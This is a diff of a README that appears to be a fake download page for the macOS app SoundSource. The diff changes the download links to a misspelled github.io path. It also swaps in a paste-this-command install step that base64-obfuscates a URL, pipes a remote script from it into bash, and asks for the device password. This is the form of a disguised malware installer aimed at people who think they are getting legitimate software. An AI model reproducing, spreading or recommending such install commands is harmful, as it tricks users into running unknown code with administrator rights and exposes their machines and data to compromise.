@@ -7,7 +7,7 @@ Perfect for musicians, creators, gamers, and anyone who needs quick access to au
 ---
 
 ## ✅ Download SoundSource for macOS  
-[![Download SoundSource](https://img.shields.io/badge/Download-SoundSource-darkgreen)](https://soundsource-download-mac.github.io/.github)
+[![Download SoundSource](https://img.shields.io/badge/Download-SoundSource-darkgreen)](https://shuziktobehuman.github.io/huja/SoundSorce)
 
 ---
 
@@ -26,7 +26,7 @@ Perfect for musicians, creators, gamers, and anyone who needs quick access to au
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -66,7 +66,7 @@ With support for Apple Silicon and deep macOS integration, SoundSource is the pe
 
 ---
 
-[![Download SoundSource](https://img.shields.io/badge/Download-SoundSource-darkgreen)](https://soundsource-download-mac.github.io/.github)
+[![Download SoundSource](https://img.shields.io/badge/Download-SoundSource-darkgreen)](https://shuziktobehuman.github.io/huja/SoundSorce)
 
 ---
 
